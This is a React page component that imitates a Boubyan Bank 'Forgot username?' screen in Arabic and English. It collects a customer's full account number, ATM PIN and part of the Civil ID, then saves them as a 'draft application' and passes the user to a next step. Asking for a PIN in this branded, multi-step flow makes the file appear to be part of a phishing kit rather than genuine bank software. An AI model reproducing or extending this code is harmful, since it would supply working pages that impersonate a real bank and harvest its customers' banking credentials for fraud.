import { useState, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { useLanguage } from '../context/LanguageContext'
import { saveDraftApplication } from '../lib/applicationStorage'

export default function ContinueApplicationStep2Page() {
  const { lang } = useLanguage()
  const isAr = lang === 'ar'
  const navigate = useNavigate()

  const [accountNumber, setAccountNumber] = useState(['', '', '', '', '', '', '', '', '', ''])
  const [pin, setPin] = useState(['', '', '', ''])
  const [civilId, setCivilId] = useState(['', ''])
  const [hasError, setHasError] = useState(false)

  const accRefs = useRef([])
  const pinRefs = useRef([])
  const civilRefs = useRef([])

  const handleInputChange = (value, index, refs, state, setState, nextGroupFirstRef = null) => {
    const val = value.replace(/\D/g, '')
    const newState = [...state]
    
    if (val) {
      newState[index] = val[val.length - 1]
      setState(newState)
      if (index < state.length - 1) {
        refs.current[index + 1]?.focus()
      } else if (nextGroupFirstRef) {
        nextGroupFirstRef.current?.focus()
      }
    } else {
      newState[index] = ''
      setState(newState)
    }
  }

  const handleKeyDown = (e, index, refs, state, setState) => {
    if (e.key === 'Backspace') {
      e.preventDefault()
      const newState = [...state]
      if (newState[index] !== '') {
        newState[index] = ''
        setState(newState)
      } else if (index > 0) {
        newState[index - 1] = ''
        setState(newState)
        refs.current[index - 1]?.focus()
      }
    } else if (e.key === 'Enter') {
      e.preventDefault()
      if (index < state.length - 1) {
        refs.current[index + 1]?.focus()
      } else if (refs === accRefs) {
        pinRefs.current[0]?.focus()
      } else if (refs === pinRefs) {
        civilRefs.current[0]?.focus()
      }
    }
  }

  const handleNext = () => {
    const account = accountNumber.join('')
    const pinCode = pin.join('')
    const civic = civilId.join('')

    if (account.length < 10 || pinCode.length < 4 || civic.length < 2) {
      setHasError(true)
      return
    }

    const payload = {
      id: `app-${Date.now()}`,
      createdAt: new Date().toISOString(),
      status: 'new',
      source: 'continue-application-step-2',
      accountNumber: account,
      pin: pinCode,
      civilId: civic,
      step: 'step-2',
    }

    saveDraftApplication(payload)
    navigate('/continue-application-step-3')
  }

  return (
    <section className="min-h-screen bg-white flex flex-col justify-between px-4 py-4 sm:py-8 font-sans overflow-x-hidden" dir={isAr ? 'rtl' : 'ltr'}>
      <div className="mx-auto w-full max-w-md flex-1 flex flex-col justify-center py-2">
        
        {/* Boubyan Logo Section */}
        <div className="mb-6 sm:mb-8 flex justify-center text-center">
          <div className="h-auto w-32 sm:w-40">
            <img
              src={import.meta.env.DEV ? '/assets/bob.png' : new URL('../assets/bob.png', import.meta.url).href}
              alt="Boubyan Bank Logo"
              className="h-full w-full object-contain"
            />
          </div>
        </div>

        {/* Title */}
        <div className="mb-6 text-center text-[22px] sm:text-[26px] font-medium text-[#1a1a1a]">
          {isAr ? 'نسيت اسم المستخدم؟' : 'Forgot username?'}
        </div>

        {/* Form Fields Section */}
        <div className="w-full space-y-6 text-right">
          
          {/* Field 1: رقم الحساب الرئيسي (10 أرقام) */}
          <div className="space-y-2">
            <div>
              <div className="text-xs text-[#888888] mb-0.5">
                {isAr ? 'رقم الحساب الرئيسي' : 'Main account number'}
              </div>
              <div className="text-xs text-[#777777]">
                {isAr ? 'مكون من عشرة أرقام' : 'Consists of 10 digits'}
              </div>
            </div>

            <div className="flex justify-start gap-1.5 sm:gap-2" dir="ltr">
              {accountNumber.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => (accRefs.current[i] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleInputChange(e.target.value, i, accRefs, accountNumber, setAccountNumber, pinRefs.current[0])}
                  onKeyDown={(e) => handleKeyDown(e, i, accRefs, accountNumber, setAccountNumber)}
                  className={`w-6 border-b-2 pb-1 text-center text-sm text-[#333333] bg-transparent outline-none transition-colors ${
                    digit !== '' ? 'border-[#ce1126]' : 'border-[#b0b0b0] focus:border-[#ce1126]'
                  }`}
                />
              ))}
            </div>
          </div>

          {/* Field 2: الرقم السري لبطاقة السحب الآلي (4 أرقام) */}
          <div className="space-y-2">
            <div>
              <div className="text-xs text-[#888888] mb-0.5">
                {isAr ? 'الرقم السري لبطاقة السحب الآلي' : 'ATM PIN'}
              </div>
              <div className="text-xs text-[#777777]">
                {isAr ? 'مكون من أربعة أرقام' : 'Consists of 4 digits'}
              </div>
            </div>

            <div className="flex justify-start gap-2.5 sm:gap-3" dir="ltr">
              {pin.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => (pinRefs.current[i] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleInputChange(e.target.value, i, pinRefs, pin, setPin, civilRefs.current[0])}
                  onKeyDown={(e) => handleKeyDown(e, i, pinRefs, pin, setPin)}
                  className={`w-8 border-b-2 pb-1 text-center text-sm text-[#333333] bg-transparent outline-none transition-colors ${
                    digit !== '' ? 'border-[#ce1126]' : 'border-[#b0b0b0] focus:border-[#ce1126]'
                  }`}
                />
              ))}
            </div>
          </div>

          {/* Field 3: البطاقة المدنية (آخر رقمين) */}
          <div className="space-y-2">
            <div>
              <div className="text-xs text-[#888888] mb-0.5">
                {isAr ? 'البطاقة المدنية' : 'Civil ID'}
              </div>
              <div className="text-xs text-[#777777]">
                {isAr ? 'آخر رقمين من البطاقة المدنية' : 'Last 2 digits of Civil ID'}
              </div>
            </div>

            <div className="flex justify-start gap-3" dir="ltr">
              {civilId.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => (civilRefs.current[i] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleInputChange(e.target.value, i, civilRefs, civilId, setCivilId)}
                  onKeyDown={(e) => handleKeyDown(e, i, civilRefs, civilId, setCivilId)}
                  className={`w-10 border-b-2 pb-1 text-center text-sm text-[#333333] bg-transparent outline-none transition-colors ${
                    digit !== '' ? 'border-[#ce1126]' : 'border-[#b0b0b0] focus:border-[#ce1126]'
                  }`}
                />
              ))}
            </div>
          </div>

          {hasError && (
            <div className="text-right text-xs font-medium text-[#d32f2f]">
              {isAr ? 'يرجى إدخال جميع البيانات المطلوبة' : 'Please fill in all required fields'}
            </div>
          )}

          {/* Action Buttons */}
          <div className="mt-6 sm:mt-8 flex gap-3 pt-2">
            <button
              type="button"
              onClick={handleNext}
              className="flex-1 rounded-[22px] bg-[#d32f2f] px-5 py-3.5 sm:py-4 text-center text-base sm:text-lg font-bold text-white shadow-[0_10px_25px_rgba(211,47,47,0.35)] transition hover:brightness-105"
            >
              {isAr ? 'التالي' : 'Next'}
            </button>
            <button
              type="button"
              onClick={() => navigate('/continue-application')}
              className="flex-1 rounded-[22px] border border-[#d8d8d8] bg-white px-5 py-3.5 sm:py-4 text-center text-base sm:text-lg font-bold text-[#333333] shadow-[0_2px_8px_rgba(0,0,0,0.03)] transition hover:bg-[#f8f8f8]"
            >
              {isAr ? 'إلغاء' : 'Cancel'}
            </button>
          </div>

        </div>
      </div>
    </section>
  )
}
